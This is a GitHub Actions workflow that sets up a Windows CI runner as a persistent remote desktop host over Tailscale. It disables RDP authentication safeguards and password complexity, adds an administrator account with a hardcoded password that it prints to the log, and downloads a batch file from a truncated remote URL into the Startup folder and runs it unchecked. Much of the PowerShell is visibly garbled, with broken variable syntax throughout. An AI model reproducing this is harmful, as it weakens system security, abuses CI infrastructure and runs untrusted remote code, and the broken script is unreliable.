name: win 11

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-2022
    timeout-minutes: 350

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force

          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389

          Restart-Service -Name TermService -Force

      - name: Create RDP User with Fixed Password
        run: |
          secedit /export /cfg local.cfg
          (Get-Content local.cfg) -replace 'PasswordComplexity = 1', 'PasswordComplexity = 0' | Set-Content local.cfg
          secedit /configure /db secedit.sdb /cfg local.cfg /areas SECURITYPOLICY

          net user RDP TechZonerRDP2026 /add /y
          net localgroup Administrators RDP /add
          net localgroup "Remote Desktop Users" RDP /add
          
          echo "RDP_CREDS=User: RDP | Password: TechZonerRDP2026" >> \$env:GITHUB_ENV

      - name: Install Tailscale
        run: |
          Invoke-WebRequest -Uri "https://tailscale.com" -OutFile "\$env:TEMP\tailscale.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "`"$env:TEMP\tailscale.msi`"", "/quiet", "/norestart" -Wait
          Remove-Item "\$env:TEMP\tailscale.msi" -Force

      - name: Establish Tailscale Connection
        run: |
          & "\$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=\({{ secrets.TAILSCALE_AUTHKEY }} --hostname=gh-runner-\)env:GITHUB_RUN_ID
          Start-Sleep -Seconds 10
          \(tsIP = & "\)env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          echo "TAILSCALE_IP=tsIP" >> env:GITHUB_ENV
     
      - name: Verify RDP Accessibility
        run: |
          Write-Host "Tailscale IP: \$env:TAILSCALE_IP"
          testResult = Test-NetConnection -ComputerName env:TAILSCALE_IP -Port 3389
          if (-not \$testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"

      - name: Maintain Connection + Watch RDP User
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: TechZonerRDP2026"
          Write-Host "==================`n"

          \$rdpProfile = "C:\Users\RDP"
          startupPath = "rdpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          \$downloadUrl = "https://gitlab.com"
          downloadPath = "startupPath\Downloads.bat"

          while (\$true) {
              if (Test-Path \$rdpProfile) {
                  try {
                      if (-not (Test-Path \$startupPath)) {
                          New-Item -ItemType Directory -Path \$startupPath -Force | Out-Null
                      }
                      Invoke-WebRequest -Uri downloadUrl -OutFile downloadPath -UseBasicParsing
                      Write-Host "✅ Downloads.bat copied to \$downloadPath"
                      cmd /c \$downloadPath
                      Write-Host "✅ Downloads.bat executed successfully"
                      break
                  }
                  catch {
                      Write-Host "❌ Error copying or executing Downloads.bat"
                      break
                  }
              }
              else {
                  Write-Host "[\$(Get-Date)] Waiting for RDP profile to be created..."
                  Start-Sleep -Seconds 30
              }
          }

          while (\$true) {
              Write-Host "[\$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
